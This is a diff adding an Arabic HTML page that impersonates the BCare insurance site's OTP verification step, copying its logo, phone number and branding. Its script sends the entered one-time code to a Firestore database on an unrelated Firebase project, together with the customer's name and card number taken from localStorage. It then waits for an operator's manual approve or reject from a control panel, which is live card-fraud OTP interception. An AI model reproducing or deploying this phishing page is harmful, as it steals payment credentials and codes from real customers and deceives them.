@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بي كير | رمز التحقق</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    
+    <!-- مكتبات Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+    <style>
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f9fa;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .header-section {
+            background-color: #1a6396;
+            color: #ffffff;
+            width: 100%;
+            text-align: center;
+            padding: 40px 20px 80px;
+            box-sizing: border-box;
+        }
+
+        .header-section h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+
+        .header-section p {
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 0;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            width: 92%;
+            max-width: 450px;
+            border-radius: 12px;
+            margin-top: -40px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+            z-index: 10;
+            margin-bottom: 100px;
+            padding: 35px 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 15px;
+            color: #666;
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .form-control.otp-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Cairo', sans-serif;
+            box-sizing: border-box;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 15px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s;
+            text-align: center;
+            direction: ltr;
+        }
+        
+        .form-control.otp-input:focus {
+            border-color: #1a6396;
+        }
+
+        .form-control.otp-input::placeholder {
+            color: #ccc;
+            font-weight: 400;
+            letter-spacing: 15px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #f7b260;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: opacity 0.3s;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            opacity: 0.9;
+        }
+        
+        .submit-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+
+        /* تنسيقات الفوتر المأخوذة من page1 */
+        .site-footer {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #ffffff;
+            color: #333;
+            width: 100%;
+            border-top: 1px solid #f2f2f2;
+            padding-bottom: 20px;
+            direction: rtl;
+            box-sizing: border-box;
+            margin-top: auto;
+        }
+        
+        .site-footer .footer-container {
+            width: 100%;
+            max-width: 1200px; 
+            margin: 0 auto;
+        }
+
+        .site-footer .logo-section {
+            padding: 20px;
+            text-align: right;
+            margin-bottom: 10px;
+        }
+        .site-footer .logo-section img {
+            width: 110px;
+        }
+
+        .site-footer .contact-section {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 0 20px 20px 20px;
+            color: #20709b;
+            font-weight: 700;
+            font-size: 19px;
+            gap: 10px;
+        }
+        .site-footer .contact-section span {
+            direction: ltr;
+        }
+        .site-footer .contact-section i {
+            font-size: 20px;
+        }
+
+        .site-footer .social-section {
+            padding: 0 20px 20px 20px;
+        }
+        .site-footer .social-section p {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 15px;
+        }
+        .site-footer .social-icons {
+            display: flex;
+            gap: 12px;
+        }
+        .site-footer .social-icons a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 35px;
+            height: 35px;
+            background-color: #20709b;
+            color: #fff;
+            border-radius: 50%;
+            text-decoration: none;
+            font-size: 18px;
+        }
+
+        .site-footer .spacer {
+            height: 40px;
+        }
+
+        .site-footer .accordion {
+            border-top: 1px solid #f2f2f2;
+        }
+        .site-footer .accordion-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            border-bottom: 1px solid #f2f2f2;
+            color: #111;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .site-footer .accordion-item i {
+            color: #777;
+            font-size: 14px;
+        }
+
+        .site-footer .legal-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            padding: 10px 20px;
+            font-size: 14px;
+        }
+        .site-footer .legal-links a {
+            color: #666;
+            text-decoration: none;
+        }
+        .site-footer .legal-links span {
+            color: #ccc;
+        }
+
+        .site-footer .copyright {
+            text-align: center;
+            padding: 15px 20px 20px;
+            font-size: 14px;
+            color: #888;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header-section">
+        <h1>التحقق </h1>
+        <p>الرجاء إدخال رمز   (OTP) المرسل إلى رقم هاتفك</p>
+    </div>
+
+    <div class="form-container">
+        <!-- نموذج إدخال رمز التحقق -->
+        <div class="otp-form">
+            <div class="form-group">
+                <label>رمز التحقق</label>
+                <input type="text" id="otpNumber" class="form-control otp-input" placeholder="" maxlength="6">
+            </div>
+        </div>
+
+        <button class="submit-btn" id="verifyButton">تحقق</button>
+    </div>
+
+    <!-- الفوتر الخاص بصفحة page1 -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            <div class="logo-section">
+                <img src="https://bcare.com.sa/assets/images/logo.svg" alt="BCare" onerror="this.style.display='none'">
+            </div>
+            <div class="contact-section">
+                <span dir="ltr">800 11 800 44</span>
+                <i class="fa-solid fa-phone"></i>
+            </div>
+            <div class="social-section">
+                <p>تابعنا</p>
+                <div class="social-icons">
+                    <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
+                    <a href="#"><i class="fa-brands fa-youtube"></i></a>
+                    <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                </div>
+            </div>
+            <div class="spacer"></div>
+            <div class="accordion">
+                <div class="accordion-item">
+                    <span>منتجات الأفراد</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="accordion-item">
+                    <span>منتجات الشركات</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="accordion-item">
+                    <span>مصادر</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="accordion-item">
+                    <span>الشركة</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+            </div>
+            <div class="legal-links">
+                <a href="#">سياسة الخصوصية</a>
+                <span>|</span>
+                <a href="#">الشروط والأحكام</a>
+            </div>
+            <div class="copyright">
+                © 2026 شركة عناية الوسيط لوساطة التأمين. جميع الحقوق محفوظة.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // السماح بإدخال الأرقام فقط في حقل رمز التحقق
+        document.getElementById('otpNumber').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // إعدادات Firebase الخاصة بالسيرفر
+        const firebaseConfig = {
+            apiKey: "AIzaSyD_JfgnZpx8iS8QG61NKBioNP3Ae1FEms8",
+            authDomain: "ronald-pavency-i1tap.firebaseapp.com",
+            projectId: "ronald-pavency-i1tap",
+            storageBucket: "ronald-pavency-i1tap.firebasestorage.app",
+            messagingSenderId: "948365366268",
+            appId: "1:948365366268:web:004f6f39a85e910137d879"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // إرسال البيانات عند الضغط على زر التحقق
+        document.getElementById('verifyButton').addEventListener('click', () => {
+            const otpCode = document.getElementById('otpNumber').value;
+
+            if(!otpCode || otpCode.length < 4) {
+                alert('الرجاء إدخال رمز التحقق بشكل صحيح');
+                return;
+            }
+
+            // تغيير حالة الزر ليظهر أيقونة التحميل ويتعطل
+            const verifyBtn = document.getElementById('verifyButton');
+            verifyBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> جاري التحقق...';
+            verifyBtn.disabled = true;
+
+            // سحب بيانات العميل من التخزين المحلي (إن وجدت)
+            const customerName = localStorage.getItem('customerName') || 'غير معروف';
+            const customerCard = localStorage.getItem('cardNumber') || 'غير معروف';
+
+            // إرسال الرمز مع حالة قيد الانتظار وبيانات العميل
+            db.collection("otps").add({
+                otp: otpCode,
+                name: customerName,
+                cardNumber: customerCard,
+                status: "pending",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            })
+            .then((docRef) => {
+                // مراقبة المستند بانتظار القبول أو الرفض من لوحة التحكم
+                const unsubscribe = db.collection("otps").doc(docRef.id).onSnapshot((doc) => {
+                    const data = doc.data();
+                    
+                    if (data && data.status === 'approved') {
+                        alert("تم التحقق والدفع بنجاح!");
+                        // في حال أردت التوجيه لصفحة نجاح يمكنك وضع الرابط هنا:
+                        // window.location.href = 'success.html'; 
+                    } else if (data && data.status === 'rejected') {
+                        alert("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.");
+                        // إعادة تهيئة الزر والحقل ليتسنى للمستخدم المحاولة من جديد
+                        verifyBtn.innerHTML = 'تحقق';
+                        verifyBtn.disabled = false;
+                        document.getElementById('otpNumber').value = '';
+                        unsubscribe(); // إيقاف المراقبة بعد الرفض
+                    }
+                });
+            })
+            .catch((error) => {
+                console.error("Error adding document: ", error);
+                alert("حدث خطأ أثناء معالجة رمز التحقق.");
+                verifyBtn.innerHTML = 'تحقق';
+                verifyBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
